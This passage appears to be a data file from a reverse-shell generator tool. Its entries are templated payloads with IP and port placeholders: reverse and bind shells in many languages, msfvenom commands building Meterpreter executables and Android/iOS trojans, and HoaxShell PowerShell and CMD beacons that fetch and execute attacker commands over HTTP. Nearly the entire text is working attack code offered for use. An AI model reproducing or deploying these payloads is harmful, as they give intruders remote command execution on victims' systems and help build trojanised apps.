                                                  'null )\r\n'
                                                  '                    '
                                                  'w.close();\r\n'
                                                  '            } catch( '
                                                  'Exception e ){}\r\n'
                                                  '        }\r\n'
                                                  '    }\r\n'
                                                  ' \r\n'
                                                  '    try {\r\n'
                                                  '        Socket socket = new '
                                                  'Socket( "{ip}", {port} ); '
                                                  '// Replace with wanted ip '
                                                  'and port\r\n'
                                                  '        Process process = '
                                                  'Runtime.getRuntime().exec( '
                                                  'shellPath );\r\n'
                                                  '        new '
                                                  'StreamConnector(process.getInputStream(), '
                                                  'socket.getOutputStream()).start();\r\n'
                                                  '        new '
                                                  'StreamConnector(socket.getInputStream(), '
                                                  'process.getOutputStream()).start();\r\n'
                                                  '        out.println("port '
                                                  'opened on " + socket);\r\n'
                                                  '     } catch( Exception e ) '
                                                  '{}\r\n'
                                                  '%>\r\n'
                                                  '</pre>\r\n'
                                                  '</body>\r\n'
                                                  '</html>',
                                       'meta': ['windows',
                                                'linux',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'Java Two Way'},
                                      {'command': 'String command = "var host '
                                                  '= \'{ip}\';" +\r\n'
                                                  '                       "var '
                                                  'port = {port};" +\r\n'
                                                  '                       "var '
                                                  'cmd = \'{shell}\';"+\r\n'
                                                  '                       "var '
                                                  's = new '
                                                  'java.net.Socket(host, '
                                                  'port);" +\r\n'
                                                  '                       "var '
                                                  'p = new '
                                                  'java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+\r\n'
                                                  '                       "var '
                                                  'pi = p.getInputStream(), pe '
                                                  '= p.getErrorStream(), si = '
                                                  's.getInputStream();"+\r\n'
                                                  '                       "var '
                                                  'po = p.getOutputStream(), '
                                                  'so = '
                                                  's.getOutputStream();"+\r\n'
                                                  '                       '
                                                  '"print '
                                                  '(\'Connected\');"+\r\n'
                                                  '                       '
                                                  '"while (!s.isClosed()) '
                                                  '{"+\r\n'
                                                  '                       "    '
                                                  'while (pi.available() > '
                                                  '0)"+\r\n'
                                                  '                       '
                                                  '"        '
                                                  'so.write(pi.read());"+\r\n'
                                                  '                       "    '
                                                  'while (pe.available() > '
                                                  '0)"+\r\n'
                                                  '                       '
                                                  '"        '
                                                  'so.write(pe.read());"+\r\n'
                                                  '                       "    '
                                                  'while (si.available() > '
                                                  '0)"+\r\n'
                                                  '                       '
                                                  '"        '
                                                  'po.write(si.read());"+\r\n'
                                                  '                       "    '
                                                  'so.flush();"+\r\n'
                                                  '                       "    '
                                                  'po.flush();"+\r\n'
                                                  '                       "    '
                                                  'java.lang.Thread.sleep(50);"+\r\n'
                                                  '                       "    '
                                                  'try {"+\r\n'
                                                  '                       '
                                                  '"        '
                                                  'p.exitValue();"+\r\n'
                                                  '                       '
                                                  '"        break;"+\r\n'
                                                  '                       "    '
                                                  '}"+\r\n'
                                                  '                       "    '
                                                  'catch (e) {"+\r\n'
                                                  '                       "    '
                                                  '}"+\r\n'
                                                  '                       '
                                                  '"}"+\r\n'
                                                  '                       '
                                                  '"p.destroy();"+\r\n'
                                                  '                       '
                                                  '"s.close();";\r\n'
                                                  'String x = '
                                                  '"\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";\r\n'
                                                  'ref.add(new '
                                                  'StringRefAddr("x", x);',
                                       'meta': ['linux',
                                                'mac',
                                                'windows',
                                                'ReverseShell'],
                                       'name': 'Javascript'},
                                      {'command': 'String host="{ip}";int '
                                                  'port={port};String '
                                                  'cmd="{shell}";Process p=new '
                                                  'ProcessBuilder(cmd).redirectErrorStream(true).start();Socket '
                                                  's=new '
                                                  'Socket(host,port);InputStream '
                                                  'pi=p.getInputStream(),pe=p.getErrorStream(), '
                                                  'si=s.getInputStream();OutputStream '
                                                  'po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try '
                                                  '{p.exitValue();break;}catch '
                                                  '(Exception '
                                                  'e){}};p.destroy();s.close();',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'Groovy'},
                                      {'command': 'TF=$(mktemp -u);mkfifo $TF '
                                                  '&& telnet {ip} {port} 0<$TF '
                                                  '| {shell} 1>$TF',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'telnet'},
                                      {'command': "zsh -c 'zmodload "
                                                  'zsh/net/tcp && ztcp {ip} '
                                                  '{port} && zsh >&$REPLY '
                                                  "2>&$REPLY 0>&$REPLY'",
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'zsh'},
                                      {'command': 'lua -e '
                                                  '"require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'{shell} '
                                                  '-i <&3 >&3 2>&3\');"',
                                       'meta': ['linux', 'ReverseShell'],
                                       'name': 'Lua #1'},
                                      {'command': "lua5.1 -e 'local host, port "
                                                  '= "{ip}", {port} local '
                                                  'socket = require("socket") '
                                                  'local tcp = socket.tcp() '
                                                  'local io = require("io") '
                                                  'tcp:connect(host, port); '
                                                  'while true do local cmd, '
                                                  'status, partial = '
                                                  'tcp:receive() local f = '
                                                  'io.popen(cmd, "r") local s '
                                                  '= f:read("*a") f:close() '
                                                  'tcp:send(s) if status == '
                                                  '"closed" then break end end '
                                                  "tcp:close()'",
                                       'meta': ['linux',
                                                'windows',
                                                'ReverseShell'],
                                       'name': 'Lua #2'},
                                      {'command': "echo 'package "
                                                  'main;import"os/exec";import"net";func '
                                                  'main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' '
                                                  '> /tmp/t.go && go run '
                                                  '/tmp/t.go && rm /tmp/t.go',
                                       'meta': ['linux',
                                                'mac',
                                                'windows',
                                                'ReverseShell'],
                                       'name': 'Golang'},
                                      {'command': "echo 'import os' > /tmp/t.v "
                                                  "&& echo 'fn main() { "
                                                  'os.system("nc -e {shell} '
                                                  '{ip} {port} 0>&1") }\' >> '
                                                  '/tmp/t.v && v run /tmp/t.v '
                                                  '&& rm /tmp/t.v',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Vlang'},
                                      {'command': "awk 'BEGIN {s = "
                                                  '"/inet/tcp/0/{ip}/{port}"; '
                                                  'while(42) { do{ printf '
                                                  '"shell>" |& s; s |& getline '
                                                  'c; if(c){ while ((c |& '
                                                  'getline) > 0) print $0 |& '
                                                  's; close(c); } } while(c != '
                                                  '"exit") close(s); }}\' '
                                                  '/dev/null',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Awk'},
                                      {'command': "import 'dart:io';\n"
                                                  "import 'dart:convert';\n"
                                                  '\n'
                                                  'main() {\n'
                                                  '  Socket.connect("{ip}", '
                                                  '{port}).then((socket) {\n'
                                                  '    socket.listen((data) {\n'
                                                  '      '
                                                  "Process.start('{shell}', "
                                                  '[]).then((Process process) '
                                                  '{\n'
                                                  '        '
                                                  'process.stdin.writeln(new '
                                                  'String.fromCharCodes(data).trim());\n'
                                                  '        process.stdout\n'
                                                  '          '
                                                  '.transform(utf8.decoder)\n'
                                                  '          .listen((output) '
                                                  '{ socket.write(output); '
                                                  '});\n'
                                                  '      });\n'
                                                  '    },\n'
                                                  '    onDone: () {\n'
                                                  '      socket.destroy();\n'
                                                  '    });\n'
                                                  '  });\n'
                                                  '}',
                                       'meta': ['linux',
                                                'mac',
                                                'windows',
                                                'ReverseShell'],
                                       'name': 'Dart'},
                                      {'command': "crystal eval 'require "
                                                  '"process";require '
                                                  '"socket";c=Socket.tcp(Socket::Family::INET);c.connect("{ip}",{port});loop{m,l=c.receive;p=Process.new(m.rstrip("\\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}\'',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'Crystal (system)'},
                                      {'command': 'require "process"\n'
                                                  'require "socket"\n'
                                                  '\n'
                                                  'c = '
                                                  'Socket.tcp(Socket::Family::INET)\n'
                                                  'c.connect("{ip}", {port})\n'
                                                  'loop do \n'
                                                  '  m, l = c.receive\n'
                                                  '  p = '
                                                  'Process.new(m.rstrip("\\n"), '
                                                  'output:Process::Redirect::Pipe, '
                                                  'shell:true)\n'
                                                  '  c << '
                                                  'p.output.gets_to_end\n'
                                                  'end',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Crystal (code)'},
                                      {'command': 'python3 -c \'exec("""import '
                                                  'socket as s,subprocess as '
                                                  'sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, '
                                                  '1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\n'
                                                  'while True: '
                                                  'd=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\'',
                                       'meta': ['bind',
                                                'mac',
                                                'linux',
                                                'windows',
                                                'BindShell'],
                                       'name': 'Python3 Bind'},
                                      {'command': 'php -r '
                                                  '\'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ '
                                                  '",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\'',
                                       'meta': ['bind',
                                                'mac',
                                                'linux',
                                                'windows',
                                                'BindShell'],
                                       'name': 'PHP Bind'},
                                      {'command': 'rm -f /tmp/f; mkfifo '
                                                  '/tmp/f; cat /tmp/f | '
                                                  '/bin/sh -i 2>&1 | nc -l '
                                                  '0.0.0.0 {port} > /tmp/f',
                                       'meta': ['bind',
                                                'mac',
                                                'linux',
                                                'BindShell'],
                                       'name': 'nc Bind'},
                                      {'command': "perl -e 'use "
                                                  'Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, '
                                                  'INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close '
                                                  'C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh '
                                                  '-i");};\'',
                                       'meta': ['bind',
                                                'mac',
                                                'linux',
                                                'BindShell'],
                                       'name': 'Perl Bind'},
                                      {'command': 'msfvenom -p '
                                                  'windows/x64/meterpreter/reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'exe -o reverse.exe',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'staged',
                                                'meterpreter',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Windows Meterpreter Staged '
                                               'Reverse TCP (x64)'},
                                      {'command': 'msfvenom -p '
                                                  'windows/x64/meterpreter_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'exe -o reverse.exe',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Windows Meterpreter Stageless '
                                               'Reverse TCP (x64)'},
                                      {'command': 'msfvenom -p '
                                                  'windows/x64/shell/reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'exe -o reverse.exe',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'staged',
                                                'meterpreter',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Windows Staged Reverse TCP '
                                               '(x64)'},
                                      {'command': 'msfvenom -p '
                                                  'windows/x64/shell_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'exe -o reverse.exe',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Windows Stageless Reverse TCP '
                                               '(x64)'},
                                      {'command': 'msfvenom -p '
                                                  'windows/x64/meterpreter/reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'jsp -o ./rev.jsp',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'staged',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Windows Staged JSP Reverse '
                                               'TCP'},
                                      {'command': 'msfvenom -p '
                                                  'linux/x64/meterpreter/reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'elf -o reverse.elf',
                                       'meta': ['msfvenom',
                                                'linux',
                                                'meterpreter',
                                                'staged',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Linux Meterpreter Staged '
                                               'Reverse TCP (x64)'},
                                      {'command': 'msfvenom -p '
                                                  'linux/x64/shell_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'elf -o reverse.elf',
                                       'meta': ['msfvenom',
                                                'linux',
                                                'meterpreter',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Linux Stageless Reverse TCP '
                                               '(x64)'},
                                      {'command': 'msfvenom -a x86 --platform '
                                                  'Windows -p '
                                                  'windows/shell/bind_tcp -e '
                                                  'x86/shikata_ga_nai -b '
                                                  "'\x00' -f python -v notBuf "
                                                  '-o shellcode',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'bind',
                                                'bufferoverflow',
                                                'MSFVenom'],
                                       'name': 'Windows Bind TCP ShellCode - '
                                               'BOF'},
                                      {'command': 'msfvenom -p '
                                                  'osx/x64/meterpreter/reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'macho -o shell.macho',
                                       'meta': ['msfvenom',
                                                'mac',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'macOS Meterpreter Staged '
                                               'Reverse TCP (x64)'},
                                      {'command': 'msfvenom -p '
                                                  'osx/x64/meterpreter_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'macho -o shell.macho',
                                       'meta': ['msfvenom',
                                                'mac',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'macOS Meterpreter Stageless '
                                               'Reverse TCP (x64)'},
                                      {'command': 'msfvenom -p '
                                                  'osx/x64/shell_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'macho -o shell.macho',
                                       'meta': ['msfvenom',
                                                'mac',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'macOS Stageless Reverse TCP '
                                               '(x64)'},
                                      {'command': 'msfvenom -p '
                                                  'php/meterpreter_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'raw -o shell.php',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'linux',
                                                'meterpreter',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'PHP Meterpreter Stageless '
                                               'Reverse TCP'},
                                      {'command': 'msfvenom -p php/reverse_php '
                                                  'LHOST={ip} LPORT={port} -o '
                                                  'shell.php',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'linux',
                                                'meterpreter',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'PHP Reverse PHP'},
                                      {'command': 'msfvenom -p '
                                                  'java/jsp_shell_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'raw -o shell.jsp',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'linux',
                                                'meterpreter',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'JSP Stageless Reverse TCP'},
                                      {'command': 'msfvenom -p '
                                                  'java/shell_reverse_tcp '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'war -o shell.war',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'linux',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'WAR Stageless Reverse TCP'},
                                      {'command': 'msfvenom --platform android '
                                                  '-p '
                                                  'android/meterpreter/reverse_tcp '
                                                  'lhost={ip} lport={port} R '
                                                  '-o malicious.apk',
                                       'meta': ['msfvenom',
                                                'android',
                                                'android',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Android Meterpreter Reverse '
                                               'TCP'},
                                      {'command': 'msfvenom --platform android '
                                                  '-x template-app.apk -p '
                                                  'android/meterpreter/reverse_tcp '
                                                  'lhost={ip} lport={port} -o '
                                                  'payload.apk',
                                       'meta': ['msfvenom',
                                                'android',
                                                'android',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Android Meterpreter Embed '
                                               'Reverse TCP'},
                                      {'command': 'msfvenom --platform '
                                                  'apple_ios -p '
                                                  'apple_ios/aarch64/meterpreter_reverse_tcp '
                                                  'lhost={ip} lport={port} -f '
                                                  'macho -o payload',
                                       'meta': ['msfvenom',
                                                'apple_ios',
                                                'apple_ios',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Apple iOS Meterpreter Reverse '
                                               'TCP Inline'},
                                      {'command': 'msfvenom -p '
                                                  'cmd/unix/reverse_python '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'raw',
                                       'meta': ['msfvenom',
                                                'windows',
                                                'linux',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Python Stageless Reverse TCP'},
                                      {'command': 'msfvenom -p '
                                                  'cmd/unix/reverse_bash '
                                                  'LHOST={ip} LPORT={port} -f '
                                                  'raw -o shell.sh',
                                       'meta': ['msfvenom',
                                                'linux',
                                                'macos',
                                                'stageless',
                                                'reverse',
                                                'MSFVenom'],
                                       'name': 'Bash Stageless Reverse TCP'},
                                      {'command': '@echo off&cmd /V:ON /C "SET '
                                                  'ip={ip}:{port}&&SET '
                                                  'sid="Authorization: '
                                                  'eb6a44aa-8acc1e56-629ea455"&&SET '
                                                  'protocol=http://&&curl '
                                                  '!protocol!!ip!/eb6a44aa -H '
                                                  '!sid! > NUL && for /L %i in '
                                                  '(0) do (curl -s '
                                                  '!protocol!!ip!/8acc1e56 -H '
                                                  '!sid! > !temp!cmd.bat & '
                                                  'type !temp!cmd.bat | '
                                                  'findstr None > NUL & if '
                                                  'errorlevel 1 '
                                                  '((!temp!cmd.bat > '
                                                  '!tmp!out.txt 2>&1) & curl '
                                                  '!protocol!!ip!/629ea455 -X '
                                                  'POST -H !sid! --data-binary '
                                                  '@!temp!out.txt > NUL)) & '
                                                  'timeout 1" > NUL',
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'Windows CMD cURL'},
                                      {'command': "$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM "
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/14f30f27 -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(IRM '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/650c00d7 -Headers '
                                                  '@{"Authorization"=$i});if '
                                                  "($c -ne 'None') {$r=IEX $c "
                                                  '-ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject $r;$t=IRM -Uri '
                                                  '$p$s/fef40df7 -Method POST '
                                                  '-Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                                  "-join ' ')} sleep 0.8}",
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell IEX'},
                                      {'command': "$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM "
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/bf5e666f -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(IRM '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/5498a73c -Headers '
                                                  '@{"Authorization"=$i});if '
                                                  "($c -ne 'None') {$r=IEX $c "
                                                  '-ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject $r;$t=IRM -Uri '
                                                  '$p$s/34007c82 -Method POST '
                                                  '-Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '($e+$r)} sleep 0.8}',
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell IEX Constr Lang '
                                               'Mode'},
                                      {'command': '$s=\'{ip}:{port}\';$i=\'add29918-6263f3e6-2f810c1e\';$p=\'http://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/add29918 -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(Invoke-RestMethod '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/6263f3e6 -Headers '
                                                  '@{"Authorization"=$i});if '
                                                  "($c -eq 'exit') {del "
                                                  '$f;exit} elseif ($c -ne '
                                                  '\'None\') {echo "$c" | '
                                                  'out-file -filepath '
                                                  '$f;$r=powershell -ep bypass '
                                                  '$f -ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject '
                                                  '$r;$t=Invoke-RestMethod '
                                                  '-Uri $p$s/2f810c1e -Method '
                                                  'POST -Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                                  "-join ' ')} sleep 0.8}",
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell Outfile'},
                                      {'command': '$s=\'{ip}:{port}\';$i=\'e030d4f6-9393dc2a-dd9e00a7\';$p=\'http://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/e030d4f6 -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(IRM '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/9393dc2a -Headers '
                                                  '@{"Authorization"=$i}); if '
                                                  "($c -eq 'exit') {del "
                                                  '$f;exit} elseif ($c -ne '
                                                  '\'None\') {echo "$c" | '
                                                  'out-file -filepath '
                                                  '$f;$r=powershell -ep bypass '
                                                  '$f -ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject $r;$t=IRM -Uri '
                                                  '$p$s/dd9e00a7 -Method POST '
                                                  '-Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '($e+$r)} sleep 0.8}',
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell Outfile Constr Lang '
                                               'Mode'},
                                      {'command': '@echo off&cmd /V:ON /C "SET '
                                                  'ip={ip}:{port}&&SET '
                                                  'sid="Authorization: '
                                                  'eb6a44aa-8acc1e56-629ea455"&&SET '
                                                  'protocol=https://&&curl -fs '
                                                  '-k !protocol!!ip!/eb6a44aa '
                                                  '-H !sid! > NUL & for /L %i '
                                                  'in (0) do (curl -fs -k '
                                                  '!protocol!!ip!/8acc1e56 -H '
                                                  '!sid! > !temp!cmd.bat & '
                                                  'type !temp!cmd.bat | '
                                                  'findstr None > NUL & if '
                                                  'errorlevel 1 '
                                                  '((!temp!cmd.bat > '
                                                  '!tmp!out.txt 2>&1) & curl '
                                                  '-fs -k '
                                                  '!protocol!!ip!/629ea455 -X '
                                                  'POST -H !sid! --data-binary '
                                                  '@!temp!out.txt > NUL)) & '
                                                  'timeout 1" > NUL',
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'Windows CMD cURL https'},
                                      {'command': 'add-type @"\n'
                                                  'using System.Net;using '
                                                  'System.Security.Cryptography.X509Certificates;\n'
                                                  'public class '
                                                  'TrustAllCertsPolicy : '
                                                  'ICertificatePolicy {public '
                                                  'bool '
                                                  'CheckValidationResult(\n'
                                                  'ServicePoint srvPoint, '
                                                  'X509Certificate '
                                                  'certificate,WebRequest '
                                                  'request, int '
                                                  'certificateProblem) {return '
                                                  'true;}}\n'
                                                  '"@\n'
                                                  '[System.Net.ServicePointManager]::CertificatePolicy '
                                                  '= New-Object '
                                                  'TrustAllCertsPolicy\n'
                                                  "$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod "
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/1cdbb583 -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(Invoke-RestMethod '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/f96894ff -Headers '
                                                  '@{"Authorization"=$i});if '
                                                  "($c -ne 'None') {$r=iex $c "
                                                  '-ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject '
                                                  '$r;$t=Invoke-RestMethod '
                                                  '-Uri $p$s/f99b8edc -Method '
                                                  'POST -Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                                  "-join ' ')} sleep 0.8}",
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell IEX https'},
                                      {'command': 'add-type @"\n'
                                                  'using System.Net;using '
                                                  'System.Security.Cryptography.X509Certificates;\n'
                                                  'public class '
                                                  'TrustAllCertsPolicy : '
                                                  'ICertificatePolicy {public '
                                                  'bool '
                                                  'CheckValidationResult(\n'
                                                  'ServicePoint srvPoint, '
                                                  'X509Certificate '
                                                  'certificate,WebRequest '
                                                  'request, int '
                                                  'certificateProblem) {return '
                                                  'true;}}\n'
                                                  '"@\n'
                                                  '[System.Net.ServicePointManager]::CertificatePolicy '
                                                  '= New-Object '
                                                  'TrustAllCertsPolicy\n'
                                                  "$s='{ip}:{port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod "
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/11e6bc4b -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(Invoke-RestMethod '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/fefb1eab -Headers '
                                                  '@{"Authorization"=$i});if '
                                                  "($c -ne 'None') {$r=iex $c "
                                                  '-ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject '
                                                  '$r;$t=Invoke-RestMethod '
                                                  '-Uri $p$s/68a9612e -Method '
                                                  'POST -Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '($e+$r)} sleep 0.8}',
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell Constr Lang Mode '
                                               'IEX https'},
                                      {'command': 'add-type @"\n'
                                                  'using System.Net;using '
                                                  'System.Security.Cryptography.X509Certificates;\n'
                                                  'public class '
                                                  'TrustAllCertsPolicy : '
                                                  'ICertificatePolicy {public '
                                                  'bool '
                                                  'CheckValidationResult(\n'
                                                  'ServicePoint srvPoint, '
                                                  'X509Certificate '
                                                  'certificate,WebRequest '
                                                  'request, int '
                                                  'certificateProblem) {return '
                                                  'true;}}\n'
                                                  '"@\n'
                                                  '[System.Net.ServicePointManager]::CertificatePolicy '
                                                  '= New-Object '
                                                  'TrustAllCertsPolicy\n'
                                                  '$s=\'{ip}:{port}\';$i=\'add29918-6263f3e6-2f810c1e\';$p=\'https://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/add29918 -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(Invoke-RestMethod '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/6263f3e6 -Headers '
                                                  '@{"Authorization"=$i});if '
                                                  "($c -eq 'exit') {del "
                                                  '$f;exit} elseif ($c -ne '
                                                  '\'None\') {echo "$c" | '
                                                  'out-file -filepath '
                                                  '$f;$r=powershell -ep bypass '
                                                  '$f -ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject '
                                                  '$r;$t=Invoke-RestMethod '
                                                  '-Uri $p$s/2f810c1e -Method '
                                                  'POST -Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '([System.Text.Encoding]::UTF8.GetBytes($e+$r) '
                                                  "-join ' ')} sleep 0.8}",
                                       'meta': ['windows', 'HoaxShell'],
                                       'name': 'PowerShell Outfile https'},
                                      {'command': 'add-type @"\n'
                                                  'using System.Net;using '
                                                  'System.Security.Cryptography.X509Certificates;\n'
                                                  'public class '
                                                  'TrustAllCertsPolicy : '
                                                  'ICertificatePolicy {public '
                                                  'bool '
                                                  'CheckValidationResult(\n'
                                                  'ServicePoint srvPoint, '
                                                  'X509Certificate '
                                                  'certificate,WebRequest '
                                                  'request, int '
                                                  'certificateProblem) {return '
                                                  'true;}}\n'
                                                  '"@\n'
                                                  '[System.Net.ServicePointManager]::CertificatePolicy '
                                                  '= New-Object '
                                                  'TrustAllCertsPolicy\n'
                                                  '$s=\'{ip}:{port}\';$i=\'e030d4f6-9393dc2a-dd9e00a7\';$p=\'https://\';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/e030d4f6 -Headers '
                                                  '@{"Authorization"=$i};while '
                                                  '($true){$c=(IRM '
                                                  '-UseBasicParsing -Uri '
                                                  '$p$s/9393dc2a -Headers '
                                                  '@{"Authorization"=$i}); if '
                                                  "($c -eq 'exit') {del "
                                                  '$f;exit} elseif ($c -ne '
                                                  '\'None\') {echo "$c" | '
                                                  'out-file -filepath '
                                                  '$f;$r=powershell -ep bypass '
                                                  '$f -ErrorAction Stop '
                                                  '-ErrorVariable '
                                                  'e;$r=Out-String '
                                                  '-InputObject $r;$t=IRM -Uri '
                                                  '$p$s/dd9e00a7 -Method POST '
                                                  '-Headers '
                                                  '@{"Authorization"=$i} -Body '
                                                  '($e+$r)} sleep 0.8}',
